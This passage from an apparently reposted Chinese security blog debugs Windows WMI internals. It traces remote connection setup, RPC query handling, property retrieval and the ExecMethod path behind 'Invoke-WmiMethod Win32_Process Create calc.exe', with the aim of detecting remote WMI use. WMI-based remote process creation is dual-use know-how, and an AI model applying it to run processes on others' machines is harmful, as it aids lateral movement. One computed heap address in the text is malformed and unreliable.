@...RPCServer...</div><div class="line"><span class="number">004</span>dc578  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</div><div class="line"><span class="number">004</span>dc588  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</div><div class="line"><span class="number">004</span>dc598  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  ................</div><div class="line"><span class="number">004</span>dc5a8  <span class="number">00000000</span> <span class="number">00000000</span> baadf00d baadf00d  ................</div></pre></td></tr></table></figure></p><h1 id="0x3-WMI调试1——检索信息"><a href="#0x3-WMI调试1——检索信息" class="headerlink" title="0x3 WMI调试1——检索信息"></a>0x3 WMI调试1——检索信息</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本部分以Get-WmiObject -class Win32_Process为例。</p><h2 id="0x3-1-WMI连接"><a href="#0x3-1-WMI连接" class="headerlink" title="0x3.1 WMI连接"></a>0x3.1 WMI连接</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>ConnectServerWmi函数</code>的作用是链接WMI服务器，就像之前所说的，位于wminet_utils模块的函数，只是起到存根函数的作用，其最终会调用wbemprox的<code>CLocator::ConnectServe</code>函数。<br>    <img src="http://hacky.wang/blog/20211116/vcFONnqk2U5q.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>CLocator::ConnectServe</code>函数中，最终会调用<code>CDCOMTrans::DoActualConnection</code>函数，其调用堆栈如下。<br>   <img src="http://hacky.wang/blog/20211116/4WtBgg7Koorr.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>CDCOMTrans::DoActualConnection</code>函数的主要作用是初始化_COSERVERINFO结构体，或者_COAUTHIDENTITY结构体。_COSERVERINFO结构体是一个包含激活功能的结构体。_COAUTHIDENTITY结构体则是一个包含域名，用户名密码的结构体。</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">typedef struct _COSERVERINFO &#123;</div><div class="line">  <span class="type">DWORD</span>      dwReserved1;</div><div class="line">  <span class="type">LPWSTR</span>     pwszName;</div><div class="line">  <span class="type">COAUTHINFO</span> *pAuthInfo;</div><div class="line">  <span class="type">DWORD</span>      dwReserved2;</div><div class="line">&#125; <span class="type">COSERVERINFO</span>;</div><div class="line">typedef struct _COAUTHIDENTITY &#123;</div><div class="line">  <span class="type">USHORT</span> *<span class="type">User</span>;</div><div class="line">  <span class="type">ULONG</span>  <span class="type">UserLength</span>;</div><div class="line">  <span class="type">USHORT</span> *<span class="type">Domain</span>;</div><div class="line">  <span class="type">ULONG</span>  <span class="type">DomainLength</span>;</div><div class="line">  <span class="type">USHORT</span> *<span class="type">Password</span>;</div><div class="line">  <span class="type">ULONG</span>  <span class="type">PasswordLength</span>;</div><div class="line">  <span class="type">ULONG</span>  <span class="type">Flags</span>;</div><div class="line">&#125; <span class="type">COAUTHIDENTITY</span>;</div></pre></td></tr></table></figure><p>   <img src="http://hacky.wang/blog/20211116/Iw0zssr73Lkh.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最终调用<code>CDCOMTrans::DoActualCCI</code>函数,在<code>CDCOMTrans::DoActualCCI</code>函数中，最终会调用CoCreateInstanceEx函数，CoCreateInstanceEx函数可以在指定的远程计算机上创建与给定 CLSID 关联的单个未初始化对象。而CoCreateInstance也可以创建一个实例，但是CoCreateInstance与CoCreateInstanceEx函数的区别在于CoCreateInstanceEx可以创建远程计算机的实例。 CoCreateInstanceEx函数的第一个参数是CLSID，表示要实例化对象的CLSID。在上一篇文章中，检测远程WMI连接的CLSID的值为8BC3F05E-D86B-11D0-A075-00C04FB68820。这就是为什么只要针对这个CLSID检测就可以判断是WMI远程连接了。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">HRESULT CoCreateInstanceEx(</div><div class="line">  [<span class="keyword">in</span>]      REFCLSID     Clsid,</div><div class="line">  [<span class="keyword">in</span>]      IUnknown     *punkOuter,</div><div class="line">  [<span class="keyword">in</span>]      <span class="built_in">DWORD</span>        dwClsCtx,</div><div class="line">  [<span class="keyword">in</span>]      COSERVERINFO *pServerInfo,</div><div class="line">  [<span class="keyword">in</span>]      <span class="built_in">DWORD</span>        dwCount,</div><div class="line">  [<span class="keyword">in</span>, <span class="keyword">out</span>] MULTI_QI     *pResults</div><div class="line">)<span class="comment">;</span></div><div class="line">v10 = CoCreateInstanceEx(&amp;CLSID_WbemLevel1Login, <span class="number">0</span>, 0x14u, (a3 == <span class="number">0</span> ? a2 : <span class="number">0</span>), 1u, &amp;pResults)<span class="comment">;</span></div></pre></td></tr></table></figure></p><p><img src="http://hacky.wang/blog/20211116/1rsk4BbUjTqE.png?imageslim" alt="mark"></p><h2 id="0x3-2-WMI查询"><a href="#0x3-2-WMI查询" class="headerlink" title="0x3.2 WMI查询"></a>0x3.2 WMI查询</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WMI查询操作，是通过wminet_utils模块的<code>ExecQueryWmi</code>函数调用fastprox模块的CWbemSvcWrapper::XWbemServices::ExecQuery函数，而CWbemSvcWrapper::XWbemServices::ExecQuery的第二第三个参数分别表示执行的查询语句的类型，和SQL语句的内容。WMI拥有自己的查询语句，即WQL。<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">v12</span> = pCurrentNamespace-&gt;</span><span class="function"><span class="title">lpVtbl</span>-&gt;</span>ExecQuery(pCurrentNamespace, strQueryLanguage, strQuery, lFlags, pCtx, ppEnum);</div></pre></td></tr></table></figure></p><p><img src="http://hacky.wang/blog/20211116/zNyhDok6RjBY.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最终经过ole32!ObjectStubless函数调用RPCRT4!NdrClientCall2进行RPC调用。在RPCRT4!NdrClientCall2函数中，经过Marshal，会把参数保存在RPCMSG-&gt;Buffer中。这样做的好处是方便数据的传输。<br>    <img src="http://hacky.wang/blog/20211116/P0kEbLAzogl1.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将windbg附加到WmiPrvSE.exe进程即WMI提供程序进程。因为WMI原理简单来说就是WMI消费程序通过WMI核心架构，向WMI提供程序请求数据，WMI提供程序返回相关结果。WmiPrvSE.exe进程其实是X64进程，当windbg中断在<code>call    RPCRT4!Invoke</code>,根据x64函数的调用约定，rcx应该是需要invoke的函数，rdx应该是参数的缓冲区，r9d是参数个数。可以看到，服务端WmiPrvSE.exe接收到了数据，并准备调用CreateInstanceEnumAsync函数实例化Win32_Process。<br>   <img src="http://hacky.wang/blog/20211116/bKQuXOuJVeg4.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20211116/n2YAuHRAIWg1.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20211116/1eHAV59IUnrn.png?imageslim" alt="mark"></p><h2 id="0x3-3-Get方法获取属性值"><a href="#0x3-3-Get方法获取属性值" class="headerlink" title="0x3.3 Get方法获取属性值"></a>0x3.3 Get方法获取属性值</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Get函数最终是通过调用fastprox模块的<code>CWbemObject::Get</code>方法实现的，<code>CWbemObject::Get</code>主要有调用了两个方法，分别是<code>CWbemInstance::GetProperty</code>和<code>CWbemInstance::GetPropertyType</code>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>CWbemInstance::GetProperty</code>函数主要是为了获取指定属性名的属性值，在其底层主要调用了<code>CWbemObject::GetSystemPropertyByName</code>或者<code>CWbemInstance::GetNonsystemPropertyValue</code>函数，前者主要获取的是系统属性值，而后者是获取非系统属性的属性值，在<code>CSystemProperties::FindName</code>函数中，可以看到系统属性有哪些。<br>   <img src="http://hacky.wang/blog/20211116/ITrmOmdOQrfg.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在调用<code>CWbemObject::GetSystemPropertyByName</code>函数之前，在堆栈中看到需要查看的属性名为__PATH,调用结束后，可以看到返回的是一个CVar结构。CVAR偏移为0x00表示变量的类型，CVAR偏移为0x08，则表示变量的值。</p><p>  <img src="http://hacky.wang/blog/20211116/SWK4bhsP2kGS.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20211116/ILtsOYomQJad.png?imageslim" alt="mark"></p><h2 id="0x3-4-GetNames方法获取属性值"><a href="#0x3-4-GetNames方法获取属性值" class="headerlink" title="0x3.4 GetNames方法获取属性值"></a>0x3.4 GetNames方法获取属性值</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GetNames函数最终调用fastprox模块的<code>CWbemObject::GetNames</code>方法。<code>CWbemObject::GetNames</code>函数主要是获取系统和非系统的属性名。通过flag标记，判断是获取系统属性名，亦或是非系统属性名，如果lFlags为0x30，则获取系统属性名，如果为0x40，则仅获取非系统属性名,因为将结果保存SAFEARRAY结构。SAFEARRAY+0x00表示数组的维度，可知这是一个一维数组，然后偏移+0x0C表示数组首地址，该数组有多个元素构成。<br><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">typedef struct tagSAFEARRAY &#123;</div><div class="line">  <span class="type">USHORT</span>         cDims;</div><div class="line">  <span class="type">USHORT</span>         fFeatures;</div><div class="line">  <span class="type">ULONG</span>          cbElements;</div><div class="line">  <span class="type">ULONG</span>          cLocks;</div><div class="line">  <span class="type">PVOID</span>          pvData;</div><div class="line">  <span class="type">SAFEARRAYBOUND</span> rgsabound[1];</div><div class="line">&#125; <span class="type">SAFEARRAY</span>, *<span class="type">LPSAFEARRAY</span>;</div></pre></td></tr></table></figure></p><p>   <img src="http://hacky.wang/blog/20211116/kNaAw0lOW30G.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20211116/nX0PS5WRVYLK.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20211116/7bQWAgsg4hYV.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20211116/Aeg9gq8mDVwH.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20211116/vm8NsSB4DFAW.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20211116/FEcQAFinD1w3.png?imageslim" alt="mark"></p><h2 id="0x3-5-总结获取进程信息原理"><a href="#0x3-5-总结获取进程信息原理" class="headerlink" title="0x3.5 总结获取进程信息原理"></a>0x3.5 总结获取进程信息原理</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其获取进程数据的主要原理是第一次通过调用GetNames方法，获取系统属性名，然后依次调用Get方法获取属性名的属性值，接着第二次调用GetNames方法获取非系统属性值，然后依次调用Get方法获取属性值。</p><h1 id="0x4-WMI调试2——执行函数"><a href="#0x4-WMI调试2——执行函数" class="headerlink" title="0x4 WMI调试2——执行函数"></a>0x4 WMI调试2——执行函数</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本节使用的语句为Invoke-WmiMethod -class Win32_Process -Name Create calc.exe。</p><h2 id="0x4-1-初始分析"><a href="#0x4-1-初始分析" class="headerlink" title="0x4.1 初始分析"></a>0x4.1 初始分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在分析这一部分的时候，因为wminet_utils模块中没有ExecMethod相关的函数，并没有像上面一样通过wminet_utils模块来寻求突破。我们都知道WMI底层是客户端通过RPC协议远程调用服务端的函数，并接收返回值。所以我决定在RPC底层，通过中断NdrClientStub2函数，然后追溯栈回溯的方法确定调用方。最终发现其直接调用了fastprox模块的<code>IWbemServices::ExecMethod</code>函数。</p><h2 id="0x4-2-调用ExecMethod方法"><a href="#0x4-2-调用ExecMethod方法" class="headerlink" title="0x4.2 调用ExecMethod方法"></a>0x4.2 调用ExecMethod方法</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>IWbemServices::ExecMethod</code>函数的原型如下，第一个参数是Object的名字，第二个参数为函数名，第5个参数是指向传入参数的类。<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function">HRESULT <span class="title">ExecMethod</span>(<span class="params"></span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">in</span>]  <span class="keyword">const</span> BSTR       strObjectPath,</span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">in</span>]  <span class="keyword">const</span> BSTR       strMethodName,</span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">in</span>]  <span class="keyword">long</span>             lFlags,</span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">in</span>]  IWbemContext     *pCtx,</span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">in</span>]  IWbemClassObject *pInParams,</span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">out</span>] IWbemClassObject **ppOutParams,</span></span></div><div class="line"><span class="function"><span class="params">  [<span class="keyword">out</span>] IWbemCallResult  **ppCallResult</span></span></div><div class="line"><span class="function"><span class="params"></span>)</span>;</div></pre></td></tr></table></figure></p><p>   <img src="http://hacky.wang/blog/20211117/joGUv5hUI3PB.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;微软官方对pInParams的解释是<strong><em>如果执行方法不需要输入参数，则可能为NULL。否则，它指向一个 IWbemClassObject</em></strong>,并从<a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/creating-parameters-objects-in-c--" target="_blank" rel="external">https://docs.microsoft.com/en-us/windows/win32/wmisdk/creating-parameters-objects-in-c–</a>这里了解到更详细的介绍。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据微软的介绍，创建__PARAMETERS的实例的步骤如下:</p><ul><li><ol><li>确定包含方法定义的类的类路径。</li></ol></li><li><ol><li>使用从IWbemProviderInit::Initialize传入的类路径和IWbemServices指针，调用IWbemClassObject::GetMethod来检索输入和输出参数类。GetMethod方法返回一个IWbemClassObject用于访问每个类的指针。</li></ol></li><li><ol><li>使用输出类的IWbemClassObject指针，调用IWbemClassObject::SpawnInstance以创建类的实例。</li></ol></li><li><ol><li>通过设置与输出值对应的属性来填充类实例，如果方法有返回值，则设置ReturnValue属性。</li></ol></li><li><ol><li>通过IWbemObjectSink::Indicate方法将__PARAMETERS实例传递回调用者。</li></ol></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上述描述，我了解到了如果要创建这个一个__PARAMETERS实例，首先需要调用IWbemClassObject::SpawnInstance以创建类的实例，然后设置与输出值对应的属性来填充类实例。这里填充类实例是使用了<code>CWbemInstance::Put</code>函数。最终把SpawnInstance创建创建类的实例传入IWbemServices::ExecMethod的pInParams参数。</p><h2 id="0x4-3-填充类实例"><a href="#0x4-3-填充类实例" class="headerlink" title="0x4.3 填充类实例"></a>0x4.3 填充类实例</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WMI使用fastprox模块的<code>CWbemInstance::Put</code>函数设置属性值，函数原型如下,第二个参数是待修改的属性名，而第4个参数是属性值。这是一个VARIANT结构。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __stdcall CWbemInstance::Put(CWbemInstance *<span class="keyword">this</span>, LPCWSTR wszName, LONG lFlags, VARIANT *pVal, CIMTYPE vtType)</div></pre></td></tr></table></figure></p><p>   <img src="http://hacky.wang/blog/20211117/AHKTwFdBiqi2.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20211117/FW0nQVDziO81.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>CWbemInstance::Put</code>底层主要通过<code>CWbemInstance::SetPropValue</code>函数实现，首先判断是否是系统属性名，然后通过<code>CClassPart::FindPropertyInfo</code>函数获取Property信息，接着依次调用<code>CInstancePart::SetActualValue</code>函数，<code>CUntypedValue::LoadFromCVar</code>函数。和<code>CFastHeap::AllocateString</code>函数。并在<code>CFastHeap::AllocateString</code>完成属性值的设置。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;调用<code>CInstancePart::SetActualValue</code>函数，其类是CInstancePart，父类为CWbemInstance类，显然可以得出在CWbemInstance+0x68的偏移处为<code>CInstancePart</code>类。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">CInstancePart::SetActualValue((<span class="keyword">this</span> + <span class="number">0x68</span>), v5, value);<span class="comment">// this+0x68===&gt;CInstancePart</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着调用<code>CUntypedValue::LoadFromCVar</code>,其中，第三个参数为<code>(this + 0x6C)</code>,其实这是一个CFastHeap类，其位于<code>CInstancePart</code>类的第0x6C的偏移处。<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">v8 = CUntypedValue::LoadFromCVar(v16, a3, v15, (this + 0x6C), &amp;v17, v6);// this + 0x6C ====&gt;CFastHeap</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最终调用<code>CFastHeap::AllocateString</code>函数，完成对InParameters对象的赋值。v6其实就是等于[this]+pIndex。<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">CFastHeap:</span>:AllocateString(fastheap, *(v35 + <span class="number">2</span>), <span class="variable">&amp;a2</span>)</div></pre></td></tr></table></figure></p><p>  <img src="http://hacky.wang/blog/20211117/P0NPpd2tzfG2.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;简单总结一下，假设CWbemInstance位于0x06505990，通过调用<code>CInstancePart::SetActualValue</code>函数，可知CInstancePart的地址位于<code>CWbemInstance + 0x68</code>即0x065059f8。然后通过调用<code>CUntypedValue::LoadFromCVar</code>函数可知，CFastHeap的地址位于<code>CInstancePart + 0x6C</code>即06505ar64的地址。通过获取对CFastHeap取值，就可以知道参数的地址。<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">CWbemInstance ===<span class="function">=&gt;</span> <span class="number">0x06505990</span></div><div class="line">CWbemInstance + <span class="number">0x68</span> ===<span class="function">=&gt;</span> CInstancePart:<span class="number">065059</span>f8</div><div class="line">CInstancePart + <span class="number">0x6C</span> ===<span class="function">=&gt;</span> CFastHeap:<span class="number">06505</span>ar64</div></pre></td></tr></table></figure></p><p>  <img src="http://hacky.wang/blog/20211117/ivqYgKMWJA7s.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20211117/NjYWRt9snHqd.png?imageslim" alt="mark"><br>  <img src="http://hacky.wang/blog/20211117/84TTfm6p97tM.png?imageslim" alt="mark"></p><h2 id="0x4-4-总结"><a href="#0x4-4-总结" class="headerlink" title="0x4.4 总结"></a>0x4.4 总结</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上述，我们可知，<code>IWbemServices::ExecMethod</code>函数的第一，第二，第五个参数分别表示的是Class名，函数名，参数类。其中参数可以通过参数类[__PARAMETERS+0x68+0x6C]获取。由此如果需要检测WMI通过Invoke-Method的方法进行创建函数，设置注册表等行为，可以通过检测<code>IWbemServices::ExecMethod</code>的调用实现。</p><h1 id="0x5-参考文献"><a href="#0x5-参考文献" class="headerlink" title="0x5 参考文献"></a>0x5 参考文献</h1><ul><li><a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/creating-parameters-objects-in-c--" target="_blank" rel="external">Creating Parameters Objects in C++</a></li><li>软件调试补篇</li><li><a href="https://github.com/dotnet/docs/blob/main/docs/framework/unmanaged-api/wmi/index.md" target="_blank" rel="external">https://github.com/dotnet/docs/blob/main/docs/framework/unmanaged-api/wmi/index.md</a></li><li><a href="https://www.cnblogs.com/wanghaiyang1930/p/4469222.html" target="_blank" rel="external">Windows RPC Demo实现</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;本文转载于跳跳糖安全社区，原文链接为&lt;a href=&quot;https://tttang.com/archive/1640/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://tttang.com/archive/1640/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="windows系统" scheme="https://findream.github.io/categories/windows%E7%B3%BB%E7%BB%9F/"/>
    
    
  </entry>
  
</feed>
